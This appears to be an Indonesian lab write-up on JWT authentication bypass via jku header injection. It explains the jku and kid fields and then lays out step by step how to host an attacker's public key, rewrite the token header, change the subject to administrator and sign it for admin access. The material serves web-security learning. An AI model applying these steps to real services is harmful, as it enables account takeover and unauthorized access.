# JWT Authentication Bypass via JKU Injection

## Konsep

### Apa itu `jku`?

`jku` = **JSON Web Key Set URL**

Fungsinya:

```text
Memberitahu server:
"Ambil public key dari URL ini buat verify JWT"
```

Contoh:

```json
{
  "jku":"https://example.com/jwks.json"
}
```

Server:

```text
Lihat jku
↓
Download public key
↓
Verify JWT
```

---

### Kenapa bug bisa terjadi?

Normal:

```text
Server hanya percaya URL internal
↓
Download public key server
↓
Verify JWT
```

Bug:

```text
Server percaya SEMUA URL
↓
Attacker kasih URL miliknya
↓
Server download public key attacker
↓
Server verify JWT pakai key attacker
↓
JWT palsu dianggap valid
```

Inti bug:

> Server membiarkan attacker menentukan public key mana yang dipakai untuk verifikasi.

---

### Apa itu `kid`?

`kid` = **Key ID**

Fungsi:

```text
Menentukan key mana yang dipakai
```

Contoh:

```json
{
 "kid":"893d..."
}
```

Server:

```text
Cari key dengan ID:
893d...
↓
Pakai key itu
```

---

# Langkah Exploit

## 1. Generate RSA Key

Burp:

```text
JWT Editor
↓
New RSA Key
↓
Generate
```

Dapat:

```text
private_attacker
public_attacker
kid
```

---

## 2. Upload Public Key

Copy:

```text
Copy Public Key as JWK
```

Upload ke exploit server:

```json
{
 "keys":[
    public_attacker
 ]
}
```

Sekarang:

```text
URL exploit
↓
berisi public_attacker
```

---

## 3. Edit Header JWT

Awal:

```json
{
 "alg":"RS256",
 "kid":"server-key"
}
```

Ubah:

```json
{
 "alg":"RS256",
 "kid":"893d...",
 "jku":"URL exploit"
}
```

Kenapa?

### Ganti `kid`

Supaya:

```text
Server cari:
kid=893d...
↓
Ketemu public_attacker
```

### Tambah `jku`

Supaya:

```text
Server download public_attacker
```

---

## 4. Edit Payload

Awal:

```json
{
 "sub":"wiener"
}
```

Ubah:

```json
{
 "sub":"administrator"
}
```

---

## 5. Sign JWT

Klik:

```text
Sign
↓
Pilih RSA key attacker
```

JWT ditandatangani:

```text
private_attacker
```

---

# Cara Server Memproses

```text
Terima JWT
↓
Lihat jku
↓
Download public_attacker
↓
Cari kid
↓
Ketemu key
↓
Verify signature
↓
Valid
↓
Admin access
```

---

# Hafalan Cepat

```text
Generate key
↓
Upload public key
↓
Tambah jku
↓
Ganti kid
↓
sub=administrator
↓
Sign
↓
Server download key attacker
↓
JWT valid
↓
Admin
```

---

# Inti Lab

> JKU Injection = attacker membuat server memakai **public key attacker** untuk memverifikasi JWT.
